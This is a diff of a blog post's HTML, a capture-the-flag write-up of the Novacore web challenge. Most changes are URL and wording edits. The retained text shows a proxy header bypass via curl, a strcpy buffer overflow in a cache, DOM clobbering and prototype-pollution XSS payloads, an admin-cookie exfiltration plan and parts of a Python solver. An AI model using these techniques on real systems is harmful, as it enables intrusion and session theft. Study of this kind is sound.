@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<head>
   
     <title>[Web] Novacore: A Never-ending Chain (HTB Business CTF) :: elmosalamy | blog</title>
   
@@ -9,23 +9,23 @@
 <meta name="description" content="Novacore was an extremely well-designed web security challenge that appeared in Hack the Box&amp;rsquo;s Global Cyber Skills Benchmark CTF 2025 where companies like Microsoft, Cisco, Intel, Deloitte and KPMG showcased their cybersecurity talents in a one-of-a-kind business CTF." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
-<link rel="canonical" href="//localhost:1313/posts/novacore-a-never-ending-chain/" />
+<link rel="canonical" href="/posts/novacore-a-never-ending-chain/" />
 
 
 
 
-<link rel="stylesheet" href="//localhost:1313/assets/style.css">
+<link rel="stylesheet" href="/assets/style.css">
 
-  <link rel="stylesheet" href="//localhost:1313/assets/green.css">
-
-
-
-<link rel="stylesheet" href="//localhost:1313/style.css">
+  <link rel="stylesheet" href="/assets/green.css">
 
 
-<link rel="apple-touch-icon" href="//localhost:1313/img/apple-touch-icon-192x192.png">
 
-  <link rel="shortcut icon" href="//localhost:1313/img/favicon/green.png">
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="/img/favicon/green.png">
 
 
 
@@ -37,10 +37,10 @@
 <meta property="og:type" content="article" />
 <meta property="og:title" content="[Web] Novacore: A Never-ending Chain (HTB Business CTF)">
 <meta property="og:description" content="A beautiful web chain with many twists and turns with ultimate goal of RCE." />
-<meta property="og:url" content="//localhost:1313/posts/novacore-a-never-ending-chain/" />
+<meta property="og:url" content="/posts/novacore-a-never-ending-chain/" />
 <meta property="og:site_name" content="elmosalamy | blog" />
 
-  <meta property="og:image" content="//localhost:1313/images/novacore_writeup.png">
+  <meta property="og:image" content="/images/novacore_writeup.png">
 
 <meta property="og:image:width" content="2048">
 <meta property="og:image:height" content="1024">
@@ -139,7 +139,7 @@
     
 <div class="post">
   <h1 class="post-title">
-    <a href="//localhost:1313/posts/novacore-a-never-ending-chain/">[Web] Novacore: A Never-ending Chain (HTB Business CTF)</a></h1>
+    <a href="/posts/novacore-a-never-ending-chain/">[Web] Novacore: A Never-ending Chain (HTB Business CTF)</a></h1>
   <div class="post-meta">
     
       <span class="post-date">
@@ -154,15 +154,15 @@
   
   <span class="post-tags">
     
-    #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
+    #<a href="/tags/ctf/">ctf</a>&nbsp;
     
-    #<a href="//localhost:1313/tags/web/">web</a>&nbsp;
+    #<a href="/tags/web/">web</a>&nbsp;
     
   </span>
   
 
   
-    <img src="//localhost:1313/images/novacore_writeup.png" class="post-cover" alt="[Web] Novacore: A Never-ending Chain (HTB Business CTF)" />
+    <img src="/images/novacore_writeup.png" class="post-cover" alt="[Web] Novacore: A Never-ending Chain (HTB Business CTF)" />
   
 
   
@@ -626,7 +626,7 @@ schedule==1.2.2
 </span></span><span style="display:flex;"><span>	time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">10</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>	client<span style="color:#f92672">.</span>quit()
-</span></span></code></pre></div><p>We do not really care about the Chrome arguments here <a href="/posts/hack-my-bot-pwnme-2025-ctf/#chapter-4-bot-control">(although they are sometimes crucial to the solution)</a>, we care about the bot&rsquo;s flow.</p>
+</span></span></code></pre></div><p>We do not really care about the Chrome arguments here <a href="/posts/hack-my-bot-pwnme-2025-ctf/#chapter-4-bot-control">(although they are sometimes crucial to the solution)</a>, we mainly care about the bot&rsquo;s flow.</p>
 <p>The bot logs in, checks his trades at <code>/my_trades</code> for 10 seconds before finally leaving.</p>
 <p>Looking at <code>run.py</code> (the main python entrypoint), we can see that the bot logs in every minute:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
@@ -745,7 +745,7 @@ schedule==1.2.2
 </span></span></code></pre></div><p><code>token_required</code> protects endpoints by checking the <code>Authorization</code> header for an API token, this API token is granted to us on login.</p>
 <p>I found it suspicious that the author chose two separate protection mechanisms between <code>web.py</code> and <code>api.py</code> which essentially perform the same thing via different means.</p>
 <p>If we look closely, we will notice that <code>token_required()</code> contains a kill switch. The function checks for the existence of the <code>X-Real-Ip</code> header, if it doesn&rsquo;t exist, the middleware lets go.</p>
-<p>But where is <code>X-Real-Ip</code> being set anyways? It seems like <code>traefik</code> is setting for Flask, let&rsquo;s patch our app locally to confirm this. We will add a line on <code>@web.after_request</code> to print received headers:</p>
+<p>But where is <code>X-Real-Ip</code> being set anyways? It seems like <code>traefik</code> is passing it to Flask, let&rsquo;s patch our app locally to confirm this. We will add a line on <code>@web.after_request</code> to print received headers:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@web.after_request</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">apply_csp</span>(response):
 </span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Received headers:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, request<span style="color:#f92672">.</span>headers, flush<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
@@ -769,7 +769,7 @@ schedule==1.2.2
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Proto: http
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Server: a477f169e095                       
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Real-Ip: 127.0.0.1
-</span></span></span></code></pre></div><p>Notice that since <code>traefik</code> is now sitting in front of Flask, it appends a couple of <code>X-*</code> headers to tell Flask what the original IP of the request was.</p>
+</span></span></span></code></pre></div><p>Notice that since <code>traefik</code> is sitting in front of Flask, it appends a couple of <code>X-*</code> headers to tell Flask what the original IP of the request was; this prevents the reverse proxy from masking original user.</p>
 <p>A request sent to Flask internally, say using <code>curl</code> for example and not through <code>traefik</code>, does not include these <code>X-*</code> headers:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Received headers:
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host: 127.0.0.1:1337
@@ -819,7 +819,7 @@ schedule==1.2.2
 </ul>
 <p>We send a request to demonstrate the vulnerability:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://localhost:1337/ -H <span style="color:#e6db74">&#34;Connection: close, X-Real-Ip&#34;</span>
-</span></span></code></pre></div><p>And we notice that we do on the other end, <code>X-Real-Ip</code> got dropped:</p>
+</span></span></code></pre></div><p>And we notice that now on the other end, <code>X-Real-Ip</code> got dropped:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Received Headers:
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host: 127.0.0.1:1337
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">User-Agent: curl/8.12.1
@@ -829,7 +829,7 @@ schedule==1.2.2
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Port: 1337
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Proto: http
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Server: a477f169e095                       
-</span></span></span></code></pre></div><p>Brilliant! A follow up request confirms that we have, indeed, bypassed the API access control:</p>
+</span></span></span></code></pre></div><p>Brilliant! A follow up request to <code>/api/trades</code> confirms that we have, indeed, bypassed the API access control:</p>
 <pre tabindex="0"><code> curl http://94.237.122.124:47098/api/trades -H &#34;Connection: close, X-Real-Ip&#34;
 {&#34;trades&#34;:[]}
 </code></pre><h2 id="chapter-4-wreaking-havoc">Chapter 4: Wreaking Havoc<a href="#chapter-4-wreaking-havoc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
@@ -885,7 +885,7 @@ schedule==1.2.2
 </span></span><span style="display:flex;"><span>	{% endfor %}
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">tbody</span>&gt;
 </span></span></code></pre></div><p>Needless to say, the three properties, <code>action</code>, <code>price</code> and <code>symbol</code> are not sanitized giving us an HTML injection vector if we can control them.</p>
-<p>Let&rsquo;s see where the trades come from.</p>
+<p>Let&rsquo;s see where they come from.</p>
 <ol start="2">
 <li>The request is handled by <code>/my_trades</code> in <code>web.py</code>:</li>
 </ol>
@@ -1051,7 +1051,7 @@ schedule==1.2.2
 </span></span><span style="display:flex;"><span>signal:2e76d99f-afbc-4ef2-a06e-ef5123d13613
 </span></span><span style="display:flex;"><span>get signal:24c9fd30-9a88-421e-a65b-eabb2938d457
 </span></span><span style="display:flex;"><span>symbol|TSLA|action|buy|price|761.01
-</span></span></code></pre></div><p>Interesting, so we have a bunch of signals, and we can read some of them. Let&rsquo;s try to copy a signal and see what happens:</p>
+</span></span></code></pre></div><p>Interesting. So we have a bunch of signals, and we can read some of them. Let&rsquo;s try to copy a signal and see what happens:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://localhost:1337/api/copy_signal_trade <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	-H <span style="color:#e6db74">&#34;Connection: close, X-Real-Ip&#34;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	-H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
@@ -1082,22 +1082,22 @@ schedule==1.2.2
 </span></span><span style="display:flex;"><span>signal:2e76d99f-afbc-4ef2-a06e-ef5123d13613
 </span></span><span style="display:flex;"><span>user:sys_admin:trade:b0edd7e4-c6b8-46ea-9595-b58d5bf41617
 </span></span><span style="display:flex;"><span>user:1:trade:d3c562c3-d575-45e9-922f-0ee9693d16d8
-</span></span></code></pre></div><p>Aha! As we can see the admin account has <code>user_id</code> of 1. The <code>/api/trades</code> endpoint we saw earlier filtered trades based on the <code>user_id</code>:</p>
+</span></span></code></pre></div><p>Aha! As we can see a difference. The admin account has <code>user_id</code> of 1. The <code>/api/trades</code> endpoint we saw earlier filtered trades based on the <code>user_id</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>user_id <span style="color:#f92672">=</span> g<span style="color:#f92672">.</span>user<span style="color:#f92672">.</span>id <span style="color:#66d9ef">if</span> g<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;user&#34;</span>) <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;sys_admin&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># --- redacted ---</span>
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> key<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;user:</span><span style="color:#e6db74">{</span>user_id<span style="color:#e6db74">}</span><span style="color:#e6db74">:trade:&#34;</span>):
 </span></span><span style="display:flex;"><span>	<span style="color:#75715e"># --- redacted ---</span>
-</span></span></code></pre></div><p>It turns out, because we accessed the API unconventionally via a Traefik bypass, we do not have a &ldquo;real&rdquo; user session since we bypassed the <code>token_required</code> which queried and linked us with our respective <code>user_id</code>:</p>
+</span></span></code></pre></div><p>It turns out, because we accessed the API unconventionally using our Traefik bypass, we are not given a &ldquo;real&rdquo; user session. This is because we bypassed <code>token_required</code> which queried and linked us with our respective <code>user_id</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>        db_session <span style="color:#f92672">=</span> Database()
 </span></span><span style="display:flex;"><span>        valid, user <span style="color:#f92672">=</span> db_session<span style="color:#f92672">.</span>validate_token(token)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> valid:
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Invalid API token&#34;</span>}), <span style="color:#ae81ff">401</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        g<span style="color:#f92672">.</span>user <span style="color:#f92672">=</span> user
-</span></span></code></pre></div><p>So even though we have full access to the API, we are given a fallback <code>sys_admin</code> user, which cannot make requests on behalf of the bot&rsquo;s admin user which has <code>user_id</code> 1.</p>
-<p>This is a bummer! How will we write trades that can poison another user&rsquo;s feed now?</p>
-<p>Wait&hellip; There is still a very critical part of the application that we have not explored yet. The <code>aetherCache</code> key store!</p>
-<p>Let&rsquo;s inspect <code>cache/aetherCache.c</code>:</p>
+</span></span></code></pre></div><p>So even though we have full access to the API, we are given a fallback <code>sys_admin</code> user, which cannot make requests on behalf of the bot&rsquo;s admin user with <code>user_id</code> = 1.</p>
+<p>This is a bummer! How will we write trades that can poison bot&rsquo;s feed now?</p>
+<p>Going back to the drawing board, we identify a very critical part of the application that we have not explored yet. The <code>aetherCache</code> key store!</p>
+<p>Let&rsquo;s inspect <code>cache/aetherCache.c</code>. A quick look at variable declarations:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define BUFFER_SIZE 1024
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define KEY_SIZE 256
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define VALUE_SIZE 256
@@ -1110,7 +1110,7 @@ schedule==1.2.2
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Entry entries[MAX_ENTRIES];
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> entry_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span></code></pre></div><p>It is very interesting that they have fixed <code>KEY_SIZE</code> and <code>VALUE_SIZE</code> equal to 256 bytes. Let&rsquo;s see how keys are set:</p>
+</span></span></code></pre></div><p>It is very interesting that they have fixed <code>KEY_SIZE</code> and <code>VALUE_SIZE</code> equal to 256 bytes. Fixed size buffers are problematic if not handled properly. Let&rsquo;s see how keys are set:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>key, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>value) {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_lock</span>(<span style="color:#f92672">&amp;</span>entry_mutex);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> entry_count; <span style="color:#f92672">++</span>i) {
@@ -1133,9 +1133,9 @@ schedule==1.2.2
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pretty_print</span>(<span style="color:#e6db74">&#34;Error: maximum number of entries reached&#34;</span>, <span style="color:#ae81ff">2</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Interestingly, the developer took great care to make sure <code>set</code> operations are synchronized using <code>pthread_mutex_lock</code> and <code>pthread_mutex_unlock</code>. However, a quick look at how the new value is set, we find the disastrous usage of <code>strcpy(entries[i].value, value)</code>.</p>
-<p>We all know that <code>strcpy</code> is an unsafe function that does not check bounds. In this case, supplying a value larger than 256 will lead to a stack-based buffer overflow that will overwrite the key of the next entry!</p>
-<p>To confirm this, let&rsquo;s try something fun:</p>
+</span></span></code></pre></div><p>Interestingly, the developer took great care to make sure <code>set</code> operations are synchronized using <code>pthread_mutex_lock</code> and <code>pthread_mutex_unlock</code>. However, a look at how the new value is set, we find the disastrous usage of <code>strcpy(entries[i].value, value)</code>.</p>
+<p>We all know that <code>strcpy</code> is an unsafe function that does not check bounds. In this case, supplying a value larger than 256 will lead to a stack-based buffer overflow that can overwrite the key of the next entry!</p>
+<p>To confirm this, let&rsquo;s try something fun. Let&rsquo;s first check the cache:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>list
 </span></span><span style="display:flex;"><span>signal:17bb0ffc-5b96-44f3-8e86-ec104e68b5df
 </span></span><span style="display:flex;"><span>signal:a6598f42-8457-46ad-bf3a-b5aa2d97d0b6
@@ -1144,7 +1144,7 @@ schedule==1.2.2
 </span></span><span style="display:flex;"><span>signal:2e76d99f-afbc-4ef2-a06e-ef5123d13613
 </span></span><span style="display:flex;"><span>user:sys_admin:trade:b0edd7e4-c6b8-46ea-9595-b58d5bf41617
 </span></span><span style="display:flex;"><span>user:1:trade:d3c562c3-d575-45e9-922f-0ee9693d16d8
-</span></span></code></pre></div><p>We know that on the stack, our two trades are placed like this:</p>
+</span></span></code></pre></div><p>We can imagine how that looks like on the stack, our two trade entries would be placed like this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// entry 1
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">/*    key : 256 bytes    */</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/*    val : 256 bytes    */</span>
@@ -1226,11 +1226,11 @@ aelmo
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Trade updated successfully&#34;</span>, <span style="color:#e6db74">&#34;trade_id&#34;</span>: trade_id})
 </span></span></code></pre></div><p>We can supply a JSON object with either <code>symbol</code>, <code>action</code> or <code>price</code> and it will format it correctly and send a <code>set</code> command to the underlying vulnerable cache!</p>
-<p>Precise exploitation of this vector will be needed when we write our script, for now it&rsquo;s enough to know that we can modify the admin account&rsquo;s trades. On to the HTML injection</p>
+<p>Precise exploitation of this vector will be needed when we come to writing our solver, for now it&rsquo;s enough to know that we can modify the admin account&rsquo;s trades. On to the HTML injection</p>
 <h2 id="chapter-5-everybody-gets-a-clobber">Chapter 5: Everybody Gets a Clobber!<a href="#chapter-5-everybody-gets-a-clobber" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>As we saw in the last chapter, we identified a stack-based buffer overflow in the custom cache implementation. The vulnerability is exposed via the <code>/api/edit_trade</code> endpoint and allows us to control trades for any user, even ones we do not own including admin at <code>user_id</code> 1.</p>
 <p>Since trades are reflected, sans-sanitization on the <strong>My Trades</strong> page, we can perform XSS! Or can we?</p>
-<p>A quick look at the app shows us that it is using XSS&rsquo; top nemesis: <strong>Content Security Policy</strong>.</p>
+<p>A quick look at the app shows us that it is using XSS&rsquo; top nemesis: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP">Content Security Policy</a>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@web.before_request</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">before_request</span>():
 </span></span><span style="display:flex;"><span>	g<span style="color:#f92672">.</span>nonce <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>hex()
@@ -1243,7 +1243,8 @@ aelmo
 <p>Let&rsquo;s see if the website&rsquo;s own Javascript, the one that already has the nonce provided to it and is allowed to run may be vulnerable. If we can inject our own JS in one of these <em>approved</em> scripts, we will essentially bypass the CSP.</p>
 <p>Inspecting the site, we find a custom JS file imported in all dashboard pages:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/js/dashboard.js&#34;</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;3729df3f7380d660e87420775de5a8bc&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><p>Let&rsquo;s inspect it:</p>
+</span></span></code></pre></div><p>If we can find a vulnerability in this script that would allow us to execute our own code, we may be able to achieve XSS.</p>
+<p>Let&rsquo;s inspect it:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>window.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> () =&gt; {
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">merge</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">target</span>, <span style="color:#a6e22e">source</span>) =&gt; {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">attr</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">source</span>) {
@@ -1321,19 +1322,19 @@ aelmo
 </span></span></code></pre></div><p>This Javascript piece has lots going on, but it&rsquo;s quite simple once we trace it step-by-step. I traced it in reverse, starting from the <code>eval</code> function which would give us client-side execution:</p>
 <p>Take a deep breath, and let&rsquo;s say it in one go:</p>
 <blockquote>
-<p>To get XSS we need to control <code>configKeysLength</code> which is equal to <code>logData.config.length</code> which succeeds a deep merge between <code>logData</code> and <code>data</code> which is received from a call to the <code>/front_end_error/new/</code> at the <code>LOG_LEVEL.attributes.int.nodeValue</code> log level. All of this requires <code>window.UI_DEV_MODE</code> to be set and requires an error to be trigger in the wrapping <code>try</code> block.</p>
+<p>To get XSS we need to control <code>configKeysLength</code> which is equal to <code>logData.config.length</code> which succeeds a recursive merge between <code>logData</code> and <code>data</code> which is received from a call to the <code>/front_end_error/new/</code> at the <code>LOG_LEVEL.attributes.int.nodeValue</code> log level. All of these requires <code>window.UI_DEV_MODE</code> to be set and requires an error to be triggered in the wrapping <code>try</code> block.</p>
 </blockquote>
-<p>How can we achieve all of that? This took some time and experimentation, but let&rsquo;s do a forward pass through it</p>
+<p>How can we achieve all of that? This took some time and experimentation, but let&rsquo;s do a forward pass through it:</p>
 <ol>
-<li>First, we can trigger an error within the <code>try {}</code> block by clobbering <code>document.getElementById</code>. This can be achieved using <code>&lt;img name=getElementById&gt;</code> (Yea, I also didn&rsquo;t know)</li>
+<li>First, we can trigger an error within the <code>try {}</code> block by <a href="https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-clobbering.html">DOM clobbering</a> <code>document.getElementById</code>. This can be achieved using <code>&lt;img name=getElementById&gt;</code> (Yea, I also didn&rsquo;t know)</li>
 <li>Once within the <code>catch {}</code> block, we can satisfy the <code>if</code> condition by clobbering <code>window.UI_DEV_MODE</code>. This can be achieved using <code>&lt;a id=UI_DEV_MODE&gt;</code></li>
 <li>Once we get to the <code>fetch</code>, we easily make it return our own user-controlled JSON payload by accessing our same-site read-write primitive found earlier at <code>/front_end_error/view/pollution</code>. This can be achieved via DOM clobbering to path traversal using <code>&lt;a id=LOG_LEVEL int='../view/pollution'&gt;</code></li>
 <li>Once we are at <code>merge(logData, data)</code>, we can pollute the <code>.length</code> parameter with our final XSS by sending a JSON object like <code>{&quot;__proto__&quot;: {&quot;length&quot;: &quot;alert(document.origin)//&quot;}}</code></li>
 </ol>
-<p>Which looks like this:
+<p>The data flow looks like this:
 <img src="/posts/novacore-a-never-ending-chain/xss_data_flow.png"></p>
-<p>Essentially, once all constraints are in place, our XSS payload will be delivered via our read-write primitive found earlier.</p>
-<p>Our payload can also use the same read-write primitive to exfiltrate the bot&rsquo;s admin non-HttpOnly cookie since the primitive is same-site. If this wasn&rsquo;t available, a simple <code>window.href</code> redirect is also valid exfiltration method since top-level navigations are not prone to CSP.</p>
+<p>Essentially, once all constraints are in place, our XSS payload will be delivered via our read-write primitive found earlier and get executed.</p>
+<p>Our payload can also use the same read-write primitive to exfiltrate the bot&rsquo;s admin non-HttpOnly cookie since the primitive is same-site. If this wasn&rsquo;t available, a simple <code>window.href</code> redirect is also a valid exfiltration method since top-level navigations are not prone to CSP.</p>
 <blockquote>
 <p><em>Note: The final payload and how everything will be glued together is part of the last chapter where we automate this whole chain.</em></p>
 </blockquote>
@@ -1600,7 +1601,10 @@ aelmo
 </span></span></code></pre></div><p>We need to copy any active signal, I will be using the first one and copy it until we have two trades:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> len(trades <span style="color:#f92672">:=</span> api<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;/api/trades&#34;</span>)<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;trades&#34;</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
 </span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;/api/copy_signal_trade&#34;</span>, json<span style="color:#f92672">=</span>dict(signal_id<span style="color:#f92672">=</span>signal_key))
-</span></span></code></pre></div><p>We can then edit the first of the two trades to overflow it onto the second. This part is tricky as we need to craft a precise payload with all paddings calculated precisely:</p>
+</span></span></code></pre></div><p>It is important to copy two trades because <strong>aetherCache</strong> keeps an integer <code>entry_count</code> that only gets incremented when we legitimately set a new key:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> entry_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span></code></pre></div><p>Since it is also on the stack, we technically could overflow it too; however it is much simpler to just make two trades and overflow the first into the second.</p>
+<p>We can then edit the first of the two trades to overflow it onto the second. This part is tricky as we need to craft a precise payload with all paddings calculated precisely:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># we target the first trade</span>
 </span></span><span style="display:flex;"><span>trade <span style="color:#f92672">=</span> trades[<span style="color:#ae81ff">0</span>]
 </span></span><span style="display:flex;"><span>
@@ -1808,7 +1812,7 @@ aelmo
         
         
         <span class="button next">
-            <a href="//localhost:1313/posts/htb-cyber-apocalypse-2025-writeup/">
+            <a href="/posts/htb-cyber-apocalypse-2025-writeup/">
                 <span class="button__text">HTB Cyber Apocalypse 2025 Writeup - All Web</span>
                 <span class="button__icon">→</span>
             </a>
@@ -1855,8 +1859,8 @@ aelmo
   </div>
 </footer>
 
-<script src="//localhost:1313/assets/main.js"></script>
-<script src="//localhost:1313/assets/prism.js"></script>
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
 
 
 
